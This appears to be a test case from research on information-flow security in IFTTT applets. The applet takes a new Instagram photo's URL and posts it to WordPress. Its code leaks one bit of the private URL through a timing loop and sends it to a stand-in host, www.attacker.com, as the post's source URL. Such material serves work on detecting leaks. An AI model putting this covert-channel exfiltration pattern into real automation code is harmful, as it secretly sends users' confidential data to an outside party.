//Maker: dorrian
//Link2Applet: https://ifttt.com/applets/547p-post-new-instagram-photos-to-wordpress
//Title of Applet:  Post new Instagram photos to Wordpress
//Trigger service: Instagram
//Action service:Wordpress
//Policy/Presence:  Confidentiality of photos / YES


url = urlh("Instagram.anyNewPhotoByYou.Url");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (url.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 

attack = urll("www.attacker.com?" + res);
sink('Wordpress.createPhotoPostWp', 'setTitle', 'My Instagram Photo');
sink('Wordpress.createPhotoPostWp', 'setSourceUrl', attack);
